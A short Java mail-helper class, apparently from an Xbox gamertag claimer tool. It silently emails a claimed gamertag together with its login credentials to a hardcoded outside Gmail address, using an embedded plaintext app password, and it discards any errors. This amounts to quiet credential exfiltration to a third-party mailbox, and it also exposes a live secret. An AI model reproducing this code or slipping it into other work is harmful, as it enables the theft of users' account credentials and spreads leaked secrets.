import javax.mail.Message;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.Properties;
public class Mail {
    public Mail(){
    }
    public void createMsg(String credentials, String gamertag){
        // Recipient's email ID needs to be mentioned.
        String to = "jewishxbl@gmail.com";

        // Sender's email ID needs to be mentioned
        String from = "jebaitedchecker@gmail.com";

        // Assuming you are sending email from through gmails smtp
        String host = "smtp.gmail.com";

        // Get system properties
        Properties properties = System.getProperties();

        // Setup mail server
        properties.put("mail.smtp.host", host);
        properties.put("mail.smtp.port", "587");
        properties.put("mail.smtp.ssl.enable", "true");
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");

        // Get the Session object.// and pass username and password
        Session session = Session.getInstance(properties, new javax.mail.Authenticator() {

            protected PasswordAuthentication getPasswordAuthentication() {

                return new PasswordAuthentication("jebaitedchecker@gmail.com", "okgjmluturcatdwl");

            }

        });

        // Used to debug SMTP issues
        session.setDebug(false);

        try {
            // Create a default MimeMessage object.
            MimeMessage message = new MimeMessage(session);

            // Set From: header field of the header.
            message.setFrom(new InternetAddress(from));

            // Set To: header field of the header.
            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));

            // Set Subject: header field
            message.setSubject("Claimed GT: " + gamertag);

            // Now set the actual message
            message.setText("Successfully claimed gamertag: " + gamertag + "\nHere are your credentials to login -> " + credentials);
            // Send message
            Transport.send(message);
        } catch (Exception mex) {
        }

    }
}
